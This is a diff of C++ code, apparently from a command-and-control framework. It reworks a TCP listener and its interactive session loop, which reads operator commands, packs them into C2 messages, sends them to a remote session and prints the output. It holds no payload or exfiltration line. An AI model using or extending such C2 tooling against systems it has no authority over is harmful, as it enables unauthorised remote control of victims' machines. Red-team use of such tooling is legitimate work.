@@ -6,9 +6,9 @@ using boost::asio::ip::tcp;
 
 
 ListenerTcp::ListenerTcp(int idxSession, int localPort)
-	: Listener(idxSession)
+	: Listener(idxSession, localPort)
 {
-	Server* server_ = new Server(localPort);
+	Server* server_ = new Server(m_port);
 	m_serversTcp.push_back(std::move(server_));
 }
 
@@ -26,34 +26,32 @@ void ListenerTcp::connectSession()
 	bool exit = false;
 	while (!exit)
 	{
-		string data;
-		data.resize(1000);
+		string input;
+		cout << "session " << m_idxSession << "> ";
+		std::getline(std::cin, input);
 
-		string cmd;
-		cout << "session> ";
-		getline(cin, cmd);
-
-		std::vector<std::string> splitedCmd;
-		std::string delimiter = " ";
-		splitList(cmd, delimiter, splitedCmd);
-
-		if (splitedCmd[0].empty())
+		if (!input.empty())
 		{
-			std::cout << std::endl;
-		}
-		else if (splitedCmd[0] == "exit")
-		{
-			exit = true;
+			std::vector<std::string> splitedCmd;
+			std::string delimiter = " ";
+			splitList(input, delimiter, splitedCmd);
+
+			if (splitedCmd[0] == "exit")
+			{
+				exit = true;
+			}
+			else
+			{
+				C2Message c2Message;
+				execInstruction(splitedCmd, c2Message);
+
+				C2Message c2RetMessage;
+				PingPong(c2Message, c2RetMessage);
+				std::cout << "output:\n" << c2RetMessage.returnvalue() << std::endl;
+			}
 		}
 		else
-		{
-			C2Message c2Message;
-			execInstruction(splitedCmd, c2Message);
-
-			C2Message c2RetMessage;
-			PingPong(c2Message, c2RetMessage);
-			std::cout << "output:\n" << c2RetMessage.returnvalue() << std::endl;
-		}
+			std::cout << std::endl;
 	}
 
 	return;
